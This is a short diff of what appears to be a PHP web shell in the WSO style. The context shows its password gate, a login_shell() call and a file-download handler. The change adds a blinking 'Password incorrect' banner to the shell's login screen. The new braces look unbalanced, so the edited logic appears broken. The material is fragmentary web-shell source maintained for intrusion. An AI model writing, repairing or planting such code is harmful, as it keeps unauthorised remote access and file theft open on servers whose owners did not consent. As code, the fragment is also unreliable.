@@ -282,6 +282,10 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
     if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
     else
+	{
+	$err_mess = '<table width=100%><tr><td bgcolor=#0E0E0E width=100% height=24><div align=center><font color=red face=tahoma size=2><blink>Password incorrect, Please try again!!!</blink><BR></font></div></td></tr></table>';
+echo $err_mess;
+	}}
         login_shell();
 if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
     @ob_clean();
